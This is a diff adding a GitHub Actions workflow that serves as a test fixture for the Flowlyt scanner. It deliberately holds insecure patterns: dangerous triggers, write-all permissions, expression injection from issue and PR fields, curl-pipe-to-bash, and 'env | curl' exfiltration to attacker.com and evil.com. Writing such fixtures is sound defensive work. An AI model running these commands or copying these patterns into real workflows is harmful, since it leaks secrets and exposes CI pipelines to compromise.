@@ -1,0 +1,296 @@
+# Test workflow for comprehensive security rule detection
+# This file contains intentional security issues for testing Flowlyt's detection capabilities
+
+name: Test Security Rules - Comprehensive Detection
+
+# DANGEROUS TRIGGERS - should be detected
+on:
+  pull_request_target:  # Should be flagged - runs with base repo context
+    branches: [ main ]
+    types: [ opened, synchronize ]
+  workflow_run:  # Should be flagged - can be triggered by forks
+    workflows: ["CI"]
+    types: [ completed ]
+  issue_comment:  # Should be flagged - can be triggered by any user
+    types: [ created ]
+  discussion_comment:  # Should be flagged - discussion triggers
+    types: [ created ]
+  repository_dispatch:  # Should be flagged - external trigger
+    types: [ deploy ]
+  workflow_dispatch:  # Should be flagged - manual input needs validation
+    inputs:
+      environment:
+        description: 'Target environment'
+        required: true
+        type: string
+      command:
+        description: 'Command to run'
+        type: string
+
+# OVERLY PERMISSIVE PERMISSIONS - should be detected
+permissions: write-all  # Should be flagged as dangerous
+
+env:
+  # HARDCODED SECRETS - should be detected (using obviously fake values for testing)
+  AWS_ACCESS_KEY_ID: "AKIAFAKEKEY1234567890"
+  API_KEY: "sk-test-fake-key-not-real"
+  JWT_TOKEN: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXN0IjoiZmFrZSJ9.FAKE_SIGNATURE_FOR_TESTING"
+
+jobs:
+  # JOB WITHOUT TIMEOUT - should be detected
+  injection-tests:
+    runs-on: ubuntu-latest
+    # No timeout-minutes - should be flagged
+    
+    steps:
+    # CHECKOUT WITHOUT PERSIST-CREDENTIALS FALSE - should be detected
+    - uses: actions/checkout@v4
+      with:
+        fetch-depth: 0
+        # Missing persist-credentials: false
+
+    # EXPRESSION INJECTION - Issue related
+    - name: Issue title injection
+      run: |
+        echo "Processing issue: ${{ github.event.issue.title }}"
+        echo "Issue body: ${{ github.event.issue.body }}"
+        echo "Issue author: ${{ github.event.issue.user.login }}"
+
+    # EXPRESSION INJECTION - Pull request related
+    - name: PR injection vulnerabilities
+      run: |
+        echo "PR Title: ${{ github.event.pull_request.title }}"
+        echo "PR Body: ${{ github.event.pull_request.body }}"
+        echo "PR Head Ref: ${{ github.event.pull_request.head.ref }}"
+        echo "PR Head Label: ${{ github.event.pull_request.head.label }}"
+
+    # EXPRESSION INJECTION - Comment related
+    - name: Comment injection
+      run: |
+        echo "Comment: ${{ github.event.comment.body }}"
+
+    # EXPRESSION INJECTION - Discussion related (NEW)
+    - name: Discussion injection vulnerabilities
+      run: |
+        echo "Discussion title: ${{ github.event.discussion.title }}"
+        echo "Discussion body: ${{ github.event.discussion.body }}"
+        echo "Discussion author: ${{ github.event.discussion.user.login }}"
+        echo "Discussion comment: ${{ github.event.discussion_comment.body }}"
+
+    # EXPRESSION INJECTION - Review related
+    - name: Review injection
+      run: |
+        echo "Review: ${{ github.event.review.body }}"
+        echo "Review comment: ${{ github.event.review_comment.body }}"
+
+    # EXPRESSION INJECTION - Commit related
+    - name: Commit injection
+      run: |
+        echo "Commit message: ${{ github.event.head_commit.message }}"
+        echo "Commit author: ${{ github.event.head_commit.author.name }}"
+        echo "Commit email: ${{ github.event.head_commit.author.email }}"
+
+    # EXPRESSION INJECTION - Git refs
+    - name: Git ref injection
+      run: |
+        echo "Head ref: ${{ github.head_ref }}"
+        echo "Base ref: ${{ github.base_ref }}"
+        echo "Ref name: ${{ github.ref_name }}"
+
+    # EXPRESSION INJECTION - Workflow inputs
+    - name: Input injection
+      run: |
+        echo "Environment: ${{ github.event.inputs.environment }}"
+        echo "Command: ${{ github.event.inputs.command }}"
+        echo "Input direct: ${{ inputs.command }}"
+
+    # EXPRESSION INJECTION - Client payload (repository_dispatch)
+    - name: Client payload injection
+      run: |
+        echo "Payload: ${{ github.event.client_payload.message }}"
+        echo "Data: ${{ github.event.client_payload.data }}"
+
+    # EXPRESSION INJECTION - Release related (NEW)
+    - name: Release injection
+      run: |
+        echo "Release name: ${{ github.event.release.name }}"
+        echo "Release body: ${{ github.event.release.body }}"
+        echo "Release tag: ${{ github.event.release.tag_name }}"
+
+    # EXPRESSION INJECTION - Milestone related (NEW)
+    - name: Milestone injection
+      run: |
+        echo "Milestone: ${{ github.event.milestone.title }}"
+        echo "Description: ${{ github.event.milestone.description }}"
+
+    # EXPRESSION INJECTION - Project related (NEW)
+    - name: Project injection
+      run: |
+        echo "Project: ${{ github.event.project.name }}"
+        echo "Project body: ${{ github.event.project.body }}"
+        echo "Card note: ${{ github.event.project_card.note }}"
+
+    # EXPRESSION INJECTION - Label related (NEW)
+    - name: Label injection
+      run: |
+        echo "Label: ${{ github.event.label.name }}"
+        echo "Label desc: ${{ github.event.label.description }}"
+
+    # EXPRESSION INJECTION - Step outputs
+    - name: Output injection
+      run: |
+        echo "Step output: ${{ steps.previous.outputs.result }}"
+        echo "Job output: ${{ needs.other.outputs.data }}"
+
+  dangerous-operations:
+    runs-on: ubuntu-latest
+    needs: injection-tests
+    # INHERITED PERMISSIONS - should be detected
+    
+    steps:
+    # UNPINNED THIRD-PARTY ACTION - should be detected
+    - uses: some-org/untrusted-action@v1
+      with:
+        # TOKEN TO UNTRUSTED ACTION - should be detected
+        token: ${{ secrets.GITHUB_TOKEN }}
+
+    # DANGEROUS ENVIRONMENT WRITES
+    - name: Environment write injection
+      run: |
+        echo "VAR=${{ github.event.issue.title }}" >> $GITHUB_ENV
+        echo "OUTPUT=${{ github.event.comment.body }}" >> $GITHUB_OUTPUT
+
+    # INSECURE SCRIPT EXECUTION
+    - name: Insecure script patterns
+      run: |
+        curl -fsSL https://example.com/script.sh | bash
+        wget -O - https://example.com/install.sh | sh
+        eval "$USER_INPUT"
+
+    # SUSPICIOUS NETWORK CALLS
+    - name: Data exfiltration patterns
+      run: |
+        env | curl -X POST https://attacker.com/collect
+        printenv | base64 | curl -d @- https://evil.com/exfil
+
+    # PRIVILEGED DOCKER
+    - name: Privileged container
+      run: |
+        docker run --privileged alpine:latest sh -c "id"
+
+    # DANGEROUS SHELL PATTERNS
+    - name: Shell security issues
+      run: |
+        rm -rf *
+        chmod 777 /tmp/script.sh
+        sudo curl https://example.com/script.sh | bash
+
+    # SUPPLY CHAIN RISKS
+    - name: Supply chain patterns
+      run: |
+        npm install -g untrusted-package
+        pip install git+https://github.com/attacker/malicious
+
+    # LOGGING SECRETS
+    - name: Secret logging
+      run: |
+        echo "Token: ${{ secrets.GITHUB_TOKEN }}"
+        printenv | grep -i secret
+
+  permissions-test:
+    runs-on: ubuntu-latest
+    # INDIVIDUAL DANGEROUS PERMISSIONS - should be detected
+    permissions:
+      contents: write
+      actions: write
+      packages: write
+      deployments: write
+      security-events: write
+      id-token: write
+    
+    # PRODUCTION ENVIRONMENT - should be detected
+    environment:
+      name: production
+      url: https://example.com
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    # LOCAL ACTION - should be detected
+    - uses: ./.github/actions/local-action
+    
+    # SELF-HOSTED RUNNER (in other job)
+    # Note: This job uses GitHub-hosted runner
+
+  self-hosted-test:
+    # SELF-HOSTED RUNNER - should be detected
+    runs-on: self-hosted
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    # DANGEROUS CHECKOUT WITH PRIVILEGED TRIGGER - should be detected
+    # (workflow uses pull_request_target)
+
+  oidc-test:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    
+    steps:
+    # OIDC ACTIONS - should be detected (informational)
+    - uses: aws-actions/configure-aws-credentials@v4
+      with:
+        role-to-assume: arn:aws:iam::123456789012:role/my-role
+        aws-region: us-east-1
+    
+    - uses: azure/login@v1
+      with:
+        client-id: ${{ secrets.AZURE_CLIENT_ID }}
+    
+    - uses: google-github-actions/auth@v2
+      with:
+        workload_identity_provider: projects/123/locations/global/workloadIdentityPools/pool/providers/provider
+
+  artifact-test:
+    runs-on: ubuntu-latest
+    
+    steps:
+    # ARTIFACT ACTIONS - should be detected
+    - uses: actions/upload-artifact@v4
+      with:
+        name: my-artifact
+        path: .  # Potentially uploads sensitive files
+    
+    - uses: actions/download-artifact@v4
+      with:
+        name: untrusted-artifact
+
+  github-script-test:
+    runs-on: ubuntu-latest
+    
+    steps:
+    # GITHUB SCRIPT WITH DANGEROUS CODE - should be detected
+    - uses: actions/github-script@v7
+      with:
+        script: |
+          const { execSync } = require('child_process');
+          execSync('echo ${{ github.event.issue.title }}');
+
+  bot-check-bypass:
+    runs-on: ubuntu-latest
+    
+    steps:
+    # DEPENDABOT CHECK BYPASS - should be detected
+    - name: Check actor
+      if: github.actor == 'dependabot[bot]'
+      run: echo "Triggered by dependabot"
+
+  reusable-workflow-test:
+    uses: ./.github/workflows/reusable.yml
+    with:
+      input1: "value"
+    secrets: inherit
+
+# Missing concurrency for deployment workflow - should be detected
